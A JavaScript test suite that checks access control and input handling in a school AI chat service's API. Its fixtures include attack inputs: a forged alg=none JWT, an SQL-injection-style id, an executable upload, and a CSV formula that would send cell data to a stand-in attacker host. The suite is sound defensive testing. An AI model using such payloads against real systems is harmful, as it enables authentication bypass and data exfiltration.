// 라우트 권한 회귀 테스트. 운영과 같은 createApp()을 임시 파일 DB로 띄워 실제 HTTP로 검사한다.
// - 인증 없이는 어떤 보호 라우트도 열리지 않는가
// - 학생이 다른 학생의 대화에 접근할 수 없는가(IDOR)
// - 학생·교사가 관리자 라우트에 접근할 수 없는가
// - 공유 이력이 있는 대화를 삭제해도 일부만 지워지지 않는가
// - 토큰 폐기, Google 토큰 검증, 오류 응답이 의도대로 동작하는가
import { describe, it, expect, beforeAll, afterAll, afterEach, vi } from 'vitest';
import crypto from 'crypto';
import fs from 'fs';
import os from 'os';
import path from 'path';
import jwt from 'jsonwebtoken';

const SECRET = 'test-secret-for-route-tests';
const CLIENT_ID = 'test-client.apps.googleusercontent.com';
const realFetch = globalThis.fetch;

let dir, server, base, db;

const ids = {
  studentA: crypto.randomUUID(),
  studentB: crypto.randomUUID(),
  inactive: crypto.randomUUID(),
  teacher: crypto.randomUUID(),
  inactiveTeacher: crypto.randomUUID(),
  removedTeacher: crypto.randomUUID(),
  admin: crypto.randomUUID(),
};
const convA = crypto.randomUUID();
const convShared = crypto.randomUUID();
const convAdminDelete = crypto.randomUUID();
const convFormula = crypto.randomUUID();
const convTeacher = crypto.randomUUID();

const sign = (userId, extra = {}, opts = {}) =>
  jwt.sign({ userId, ...extra }, SECRET, { expiresIn: '1h', ...opts });

async function api(method, url, { token, body, headers = {}, raw } = {}) {
  const res = await realFetch(`${base}${url}`, {
    method,
    headers: {
      ...(body !== undefined || raw !== undefined ? { 'Content-Type': 'application/json' } : {}),
      ...(token ? { Authorization: `Bearer ${token}` } : {}),
      ...headers,
    },
    body: raw !== undefined ? raw : body !== undefined ? JSON.stringify(body) : undefined,
  });
  const text = await res.text();
  let json = null;
  try {
    json = JSON.parse(text);
  } catch {
    // CSV 등 JSON이 아닌 응답
  }
  return { status: res.status, json, text, headers: res.headers };
}

async function seedUser(id, role, { active = 1, email, google = id } = {}) {
  await db.execute({
    sql: `INSERT INTO users (id, google_id, email, name, role, is_active) VALUES (?, ?, ?, ?, ?, ?)`,
    args: [id, google, email || `${id}@danggok.hs.kr`, `user-${role}`, role, active],
  });
}

async function seedConv(id, userId, title = '대화') {
  await db.execute({
    sql: `INSERT INTO conversations (id, user_id, title, provider, model, owner_role)
          VALUES (?, ?, ?, ?, ?, (SELECT role FROM users WHERE id = ?))`,
    args: [id, userId, title, 'claude', 'claude-sonnet-5-5', userId],
  });
  await db.execute({
    sql: `INSERT INTO messages (id, conversation_id, role, content) VALUES (?, ?, 'user', '비밀 대화 본문')`,
    args: [crypto.randomUUID(), id],
  });
}

async function seedShareToken(convId, userId) {
  await db.execute({
    sql: `INSERT INTO share_tokens (id, token_hash, conversation_id, created_by, used_at, expires_at)
          VALUES (?, ?, ?, ?, ?, ?)`,
    args: [
      crypto.randomUUID(),
      crypto.randomBytes(32).toString('hex'),
      convId,
      userId,
      new Date().toISOString(),
      new Date().toISOString(),
    ],
  });
}

const count = async (sql, args) => Number((await db.execute({ sql, args })).rows[0].c);

beforeAll(async () => {
  dir = fs.mkdtempSync(path.join(os.tmpdir(), 'route-sec-'));
  process.env.JWT_SECRET = SECRET;
  process.env.GOOGLE_CLIENT_ID = CLIENT_ID;
  process.env.TURSO_DATABASE_URL = `file:${path.join(dir, 'test.db')}`;
  process.env.TURSO_AUTH_TOKEN = '';

  const { initDatabase } = await import('../db/database.js');
  db = await initDatabase();
  await db.execute('PRAGMA foreign_keys = ON'); // 운영 Turso는 외래 키를 강제한다

  await seedUser(ids.studentA, 'student');
  await seedUser(ids.studentB, 'student');
  await seedUser(ids.inactive, 'student', { active: 0 });
  await seedUser(ids.teacher, 'teacher');
  await seedUser(ids.inactiveTeacher, 'teacher', { active: 0 });
  await seedUser(ids.removedTeacher, 'teacher', { email: 'leaving@danggok.hs.kr' });
  await seedUser(ids.admin, 'admin', { email: 'admin@example.com' });
  await db.execute({
    sql: `INSERT OR REPLACE INTO settings (key, value) VALUES ('teacher_emails', ?)`,
    args: [JSON.stringify(['leaving@danggok.hs.kr'])],
  });
  await seedConv(convA, ids.studentA);
  await seedConv(convShared, ids.studentA);
  await seedShareToken(convShared, ids.studentA);
  await seedConv(convAdminDelete, ids.studentB);
  await seedShareToken(convAdminDelete, ids.studentB);
  await seedConv(convFormula, ids.studentB, '=HYPERLINK("https://evil.example/?x="&A1)');
  await seedConv(convTeacher, ids.teacher);

  const { createApp } = await import('../app.js');
  await new Promise((resolve) => {
    server = createApp().listen(0, '127.0.0.1', resolve);
  });
  base = `http://127.0.0.1:${server.address().port}`;
}, 30000);

afterAll(async () => {
  await new Promise((resolve) => {
    server.close(resolve);
    server.closeAllConnections();
  });
  fs.rmSync(dir, { recursive: true, force: true });
});

afterEach(() => {
  vi.restoreAllMocks();
  globalThis.fetch = realFetch;
});

const PROTECTED = [
  ['GET', '/api/auth/me'],
  ['POST', '/api/auth/logout'],
  ['POST', '/api/chat'],
  ['GET', '/api/conversations'],
  ['POST', '/api/conversations'],
  ['GET', `/api/conversations/${convA}`],
  ['PATCH', `/api/conversations/${convA}`],
  ['DELETE', `/api/conversations/${convA}`],
  ['POST', '/api/upload'],
  ['POST', '/api/image/generate'],
  ['POST', '/api/tts/generate'],
  ['POST', '/api/stt/transcribe'],
  ['POST', '/api/share'],
];

const ADMIN_ONLY = [
  ['GET', '/api/teacher/students'],
  ['PATCH', `/api/teacher/students/${ids.studentA}`],
  ['POST', '/api/teacher/students/bulk-activate'],
  ['DELETE', `/api/teacher/students/${ids.studentA}`],
  ['GET', '/api/teacher/conversations'],
  ['GET', '/api/teacher/conversations/export'],
  ['GET', `/api/teacher/conversations/${convA}/messages`],
  ['DELETE', `/api/teacher/conversations/${convA}`],
  ['GET', '/api/teacher/usage'],
  ['GET', '/api/teacher/settings'],
  ['PUT', '/api/teacher/settings'],
  ['GET', '/api/teacher/teachers'],
  ['POST', '/api/teacher/teachers'],
  ['DELETE', '/api/teacher/teachers'],
  ['GET', '/api/teacher/api-keys'],
  ['PUT', '/api/teacher/api-keys'],
];

describe('인증 없는 요청', () => {
  it.each([
    ...PROTECTED,
    ...ADMIN_ONLY,
    ['GET', '/api/teacher/public-settings'],
    ['GET', '/api/teacher/my-usage'],
  ])('%s %s → 401', async (method, url) => {
    const res = await api(method, url, { body: method === 'GET' ? undefined : {} });
    expect(res.status).toBe(401);
  });
});

describe('JWT 검증', () => {
  it('alg=none 위조 토큰을 거부한다', async () => {
    const enc = (o) => Buffer.from(JSON.stringify(o)).toString('base64url');
    const forged = `${enc({ alg: 'none', typ: 'JWT' })}.${enc({ userId: ids.admin })}.`;
    expect((await api('GET', '/api/auth/me', { token: forged })).status).toBe(401);
  });

  it('같은 비밀값이라도 HS256이 아니면 거부한다', async () => {
    const token = sign(ids.admin, {}, { algorithm: 'HS512' });
    expect((await api('GET', '/api/auth/me', { token })).status).toBe(401);
  });

  it('다른 비밀값으로 서명한 토큰을 거부한다', async () => {
    const token = jwt.sign({ userId: ids.admin }, 'other-secret');
    expect((await api('GET', '/api/auth/me', { token })).status).toBe(401);
  });

  it('토큰의 role 값을 믿지 않고 DB 역할로 판정한다', async () => {
    const token = sign(ids.studentA, { role: 'admin' });
    expect((await api('GET', '/api/teacher/students', { token })).status).toBe(403);
  });
});

describe('다른 학생의 대화 접근(IDOR)', () => {
  const b = () => sign(ids.studentB);

  it('조회 404', async () => {
    const res = await api('GET', `/api/conversations/${convA}`, { token: b() });
    expect(res.status).toBe(404);
    expect(res.text).not.toContain('비밀 대화 본문');
  });

  it('제목 수정 404', async () => {
    const res = await api('PATCH', `/api/conversations/${convA}`, {
      token: b(),
      body: { title: '바꿈' },
    });
    expect(res.status).toBe(404);
  });

  it('삭제 404, 대화 유지', async () => {
    expect((await api('DELETE', `/api/conversations/${convA}`, { token: b() })).status).toBe(404);
    expect(await count('SELECT COUNT(*) c FROM conversations WHERE id = ?', [convA])).toBe(1);
  });

  it('남의 대화로 채팅 404 (AI 호출 전 차단)', async () => {
    const res = await api('POST', '/api/chat', {
      token: b(),
      body: { conversationId: convA, message: '끼어들기', provider: 'claude' },
    });
    expect(res.status).toBe(404);
    expect(
      await count('SELECT COUNT(*) c FROM messages WHERE conversation_id = ? AND content = ?', [
        convA,
        '끼어들기',
      ]),
    ).toBe(0);
  });

  it('남의 대화 공유 토큰 발급 404', async () => {
    const res = await api('POST', '/api/share', { token: b(), body: { conversationId: convA } });
    expect(res.status).toBe(404);
  });

  it('목록에 다른 학생 대화가 없다', async () => {
    const res = await api('GET', '/api/conversations', { token: b() });
    expect(res.status).toBe(200);
    expect(res.json.map((c) => c.id)).not.toContain(convA);
  });
});

describe('역할 경계', () => {
  it.each(ADMIN_ONLY)('학생 %s %s → 403', async (method, url) => {
    const res = await api(method, url, {
      token: sign(ids.studentA),
      body: method === 'GET' ? undefined : {},
    });
    expect(res.status).toBe(403);
  });

  it.each(ADMIN_ONLY)('교사 %s %s → 403', async (method, url) => {
    const res = await api(method, url, {
      token: sign(ids.teacher),
      body: method === 'GET' ? undefined : {},
    });
    expect(res.status).toBe(403);
  });

  it('학생은 교사 전용 사용량에 접근할 수 없다', async () => {
    const res = await api('GET', '/api/teacher/my-usage', { token: sign(ids.studentA) });
    expect(res.status).toBe(403);
  });

  it('학생은 이미지를 생성할 수 없다', async () => {
    const res = await api('POST', '/api/image/generate', {
      token: sign(ids.studentA),
      body: { prompt: '고양이' },
    });
    expect(res.status).toBe(403);
  });

  it('관리자도 교사 대화는 열람할 수 없다', async () => {
    const res = await api('GET', `/api/teacher/conversations/${convTeacher}/messages`, {
      token: sign(ids.admin),
    });
    expect(res.status).toBe(403);
    expect(res.text).not.toContain('비밀 대화 본문');
  });

  it('비활성 학생은 대화·공유 API를 사용할 수 없다', async () => {
    const token = sign(ids.inactive);
    expect((await api('GET', '/api/conversations', { token })).status).toBe(403);
    const res = await api('POST', '/api/share', { token, body: { conversationId: convA } });
    expect(res.status).toBe(403);
  });

  it('비활성화된 교사도 차단된다', async () => {
    const res = await api('GET', '/api/conversations', { token: sign(ids.inactiveTeacher) });
    expect(res.status).toBe(403);
  });
});

describe('공유 이력이 있는 대화 삭제', () => {
  it('학생 본인 삭제가 성공하고 메시지·토큰까지 함께 지워진다', async () => {
    const res = await api('DELETE', `/api/conversations/${convShared}`, {
      token: sign(ids.studentA),
    });
    expect(res.status).toBe(200);
    expect(await count('SELECT COUNT(*) c FROM conversations WHERE id = ?', [convShared])).toBe(0);
    expect(
      await count('SELECT COUNT(*) c FROM messages WHERE conversation_id = ?', [convShared]),
    ).toBe(0);
    expect(
      await count('SELECT COUNT(*) c FROM share_tokens WHERE conversation_id = ?', [convShared]),
    ).toBe(0);
  });

  it('관리자 삭제도 같다', async () => {
    const res = await api('DELETE', `/api/teacher/conversations/${convAdminDelete}`, {
      token: sign(ids.admin),
    });
    expect(res.status).toBe(200);
    expect(
      await count('SELECT COUNT(*) c FROM messages WHERE conversation_id = ?', [convAdminDelete]),
    ).toBe(0);
  });
});

describe('관리자 응답 최소화', () => {
  it('CSV 내보내기가 수식 시작 문자를 무력화한다', async () => {
    const res = await api('GET', '/api/teacher/conversations/export', { token: sign(ids.admin) });
    expect(res.status).toBe(200);
    expect(res.text).toContain(`"'=HYPERLINK(`);
    expect(res.text).not.toMatch(/(^|,)"?=HYPERLINK/m);
  });

  it('CSV 내보내기 쿼리를 검증한다', async () => {
    const res = await api('GET', '/api/teacher/conversations/export?userId=not-a-uuid', {
      token: sign(ids.admin),
    });
    expect(res.status).toBe(400);
  });

  it('설정 응답에 암호화된 API 키가 없다', async () => {
    await db.execute({
      sql: `INSERT OR REPLACE INTO settings (key, value) VALUES ('api_keys', ?)`,
      args: [JSON.stringify({ google: 'aa:bb:cc' })],
    });
    const token = sign(ids.admin);
    const got = await api('GET', '/api/teacher/settings', { token });
    expect(got.status).toBe(200);
    expect(got.json).not.toHaveProperty('api_keys');
    const put = await api('PUT', '/api/teacher/settings', {
      token,
      body: { key: 'tts_enabled', value: false },
    });
    expect(put.status).toBe(200);
    expect(put.json).not.toHaveProperty('api_keys');
  });

  it('학생 수정 응답에 google_id가 없고 잘못된 id는 400이다', async () => {
    const token = sign(ids.admin);
    const ok = await api('PATCH', `/api/teacher/students/${ids.studentB}`, {
      token,
      body: { chat_mode: 'learning' },
    });
    expect(ok.status).toBe(200);
    expect(ok.json).not.toHaveProperty('google_id');
    expect(ok.json.id).toBe(ids.studentB);
    const bad = await api('PATCH', '/api/teacher/students/1 OR 1=1', {
      token,
      body: { chat_mode: 'learning' },
    });
    expect(bad.status).toBe(400);
  });

  it('학생 대화 열람을 내용 없이 감사 로그로 남긴다', async () => {
    const spy = vi.spyOn(console, 'log').mockImplementation(() => {});
    const res = await api('GET', `/api/teacher/conversations/${convA}/messages`, {
      token: sign(ids.admin),
    });
    expect(res.status).toBe(200);
    const logged = spy.mock.calls.map((c) => String(c[0])).join('\n');
    expect(logged).toContain('CONVERSATION_VIEW');
    expect(logged).toContain(convA);
    expect(logged).not.toContain('비밀 대화 본문');
  });
});

describe('토큰 폐기', () => {
  it('로그아웃하면 이전 토큰이 즉시 무효가 된다', async () => {
    const id = crypto.randomUUID();
    await seedUser(id, 'student');
    const legacy = sign(id); // 배포 전 발급되어 tv가 없는 토큰
    expect((await api('GET', '/api/auth/me', { token: legacy })).status).toBe(200);
    expect((await api('POST', '/api/auth/logout', { token: legacy })).status).toBe(200);
    expect((await api('GET', '/api/auth/me', { token: legacy })).status).toBe(401);
    const fresh = sign(id, { tv: 1 });
    expect((await api('GET', '/api/auth/me', { token: fresh })).status).toBe(200);
  });

  it('교사 해제 뒤에도 교사 시절 대화는 관리자가 볼 수 없다', async () => {
    const id = crypto.randomUUID();
    const conv = crypto.randomUUID();
    await seedUser(id, 'teacher', { email: 'former@danggok.hs.kr' });
    await db.execute({
      sql: `INSERT OR REPLACE INTO settings (key, value) VALUES ('teacher_emails', ?)`,
      args: [JSON.stringify(['leaving@danggok.hs.kr', 'former@danggok.hs.kr'])],
    });
    const created = await api('POST', '/api/conversations', {
      token: sign(id),
      body: { title: '교사 비공개 대화', provider: 'claude' },
    });
    expect(created.status).toBe(201);
    await seedConv(conv, id, '이전 데이터 복원본');
    await db.execute({
      sql: `UPDATE conversations SET owner_role = 'teacher' WHERE id = ?`,
      args: [conv],
    });

    const admin = sign(ids.admin);
    await api('DELETE', '/api/teacher/teachers', {
      token: admin,
      body: { email: 'former@danggok.hs.kr' },
    });

    const list = await api('GET', `/api/teacher/conversations?userId=${id}`, { token: admin });
    expect(list.json.conversations).toEqual([]);
    const csv = await api('GET', `/api/teacher/conversations/export?userId=${id}`, {
      token: admin,
    });
    expect(csv.text).not.toContain('교사 비공개 대화');
    const detail = await api('GET', `/api/teacher/conversations/${created.json.id}/messages`, {
      token: admin,
    });
    expect(detail.status).toBe(403);
    const del = await api('DELETE', `/api/teacher/conversations/${created.json.id}`, {
      token: admin,
    });
    expect(del.status).toBe(403);
  });

  it('학생 때 만든 대화를 교사로 이어 쓰면 교직원 대화가 된다', async () => {
    delete process.env.ANTHROPIC_API_KEY; // 외부 호출이 나가지 않도록 키를 비운다
    const id = crypto.randomUUID();
    const conv = crypto.randomUUID();
    await seedUser(id, 'student');
    await seedConv(conv, id);
    await db.execute({ sql: `UPDATE users SET role = 'teacher' WHERE id = ?`, args: [id] });
    const res = await api('POST', '/api/chat', {
      token: sign(id),
      body: { conversationId: conv, message: '교사 메시지', provider: 'claude' },
    });
    expect(res.status).toBe(200);
    const row = await db.execute({
      sql: 'SELECT owner_role FROM conversations WHERE id = ?',
      args: [conv],
    });
    expect(row.rows[0].owner_role).toBe('teacher');
  });

  it('학생이 된 뒤 만든 대화는 열람 대상이다', async () => {
    const id = crypto.randomUUID();
    await seedUser(id, 'student');
    const created = await api('POST', '/api/conversations', {
      token: sign(id),
      body: { title: '학생 대화', provider: 'claude' },
    });
    const list = await api('GET', `/api/teacher/conversations?userId=${id}`, {
      token: sign(ids.admin),
    });
    expect(list.json.conversations.map((c) => c.id)).toContain(created.json.id);
  });

  it('로그아웃은 IP 공용 로그인 한도(분당 100회)에서 제외된다', async () => {
    const id = crypto.randomUUID();
    await seedUser(id, 'student');
    const me = await api('GET', '/api/auth/me', { token: sign(id) });
    expect(me.headers.get('ratelimit-limit')).toBe('100');
    const out = await api('POST', '/api/auth/logout', { token: sign(id) });
    expect(out.status).toBe(200);
    expect(out.headers.get('ratelimit-limit')).toBe('3000');
  });

  it('교사 해제 시 기존 세션이 끊긴다', async () => {
    const token = sign(ids.removedTeacher);
    expect((await api('GET', '/api/teacher/my-usage', { token })).status).toBe(200);
    const res = await api('DELETE', '/api/teacher/teachers', {
      token: sign(ids.admin),
      body: { email: 'leaving@danggok.hs.kr' },
    });
    expect(res.status).toBe(200);
    expect((await api('GET', '/api/auth/me', { token })).status).toBe(401);
  });
});

describe('Google 로그인 검증', () => {
  const good = {
    sub: 'google-sub-1',
    email: 'newstudent@danggok.hs.kr',
    email_verified: 'true',
    hd: 'danggok.hs.kr',
    aud: CLIENT_ID,
    name: '10101 테스트',
    picture: 'https://lh3.googleusercontent.com/x',
  };

  function stubGoogle(payload) {
    globalThis.fetch = vi.fn(async (url, init) => {
      if (String(url).startsWith('https://oauth2.googleapis.com/tokeninfo')) {
        return new Response(JSON.stringify(payload), { status: 200 });
      }
      return realFetch(url, init);
    });
  }

  const login = () => api('POST', '/api/auth/google', { body: { credential: 'x' } });

  it('정상 학교 계정은 동의 단계로 간다', async () => {
    stubGoogle(good);
    const res = await login();
    expect(res.status).toBe(200);
    expect(res.json.privacy_required).toBe(true);
  });

  it('aud가 다르면 거부한다', async () => {
    stubGoogle({ ...good, aud: 'other-app' });
    expect((await login()).status).toBe(401);
  });

  it('GOOGLE_CLIENT_ID가 없으면 검증을 건너뛰지 않고 거부한다', async () => {
    stubGoogle(good);
    delete process.env.GOOGLE_CLIENT_ID;
    try {
      expect((await login()).status).toBe(500);
    } finally {
      process.env.GOOGLE_CLIENT_ID = CLIENT_ID;
    }
  });

  it('이메일이 검증되지 않은 계정을 거부한다', async () => {
    stubGoogle({ ...good, email_verified: 'false' });
    expect((await login()).status).toBe(403);
  });

  it('학교 도메인 메일이어도 Workspace 계정이 아니면 거부한다', async () => {
    const { hd: _hd, ...consumer } = good;
    stubGoogle(consumer);
    expect((await login()).status).toBe(403);
  });

  it('외부 도메인 계정을 거부한다', async () => {
    stubGoogle({ ...good, email: 'someone@gmail.com', hd: undefined });
    expect((await login()).status).toBe(403);
  });
});

describe('오류 응답', () => {
  it('깨진 JSON이 요청 본문이나 스택을 응답과 로그에 남기지 않는다', async () => {
    const spy = vi.spyOn(console, 'error').mockImplementation(() => {});
    const res = await api('POST', '/api/auth/google', { raw: '{"secret-body-text' });
    expect(res.status).toBe(400);
    expect(res.json.error).toBeTruthy();
    expect(res.text).not.toContain('secret-body-text');
    expect(res.text).not.toContain('node_modules');
    expect(spy.mock.calls.join(' ')).not.toContain('secret-body-text');
  });

  it('허용되지 않은 업로드는 JSON 400이다', async () => {
    const form = new FormData();
    form.append('file', new Blob(['MZ'], { type: 'application/x-msdownload' }), 'a.exe');
    const res = await realFetch(`${base}/api/upload`, {
      method: 'POST',
      headers: { Authorization: `Bearer ${sign(ids.studentA)}` },
      body: form,
    });
    expect(res.status).toBe(400);
    expect((await res.json()).error).toContain('허용되지 않는');
  });
});
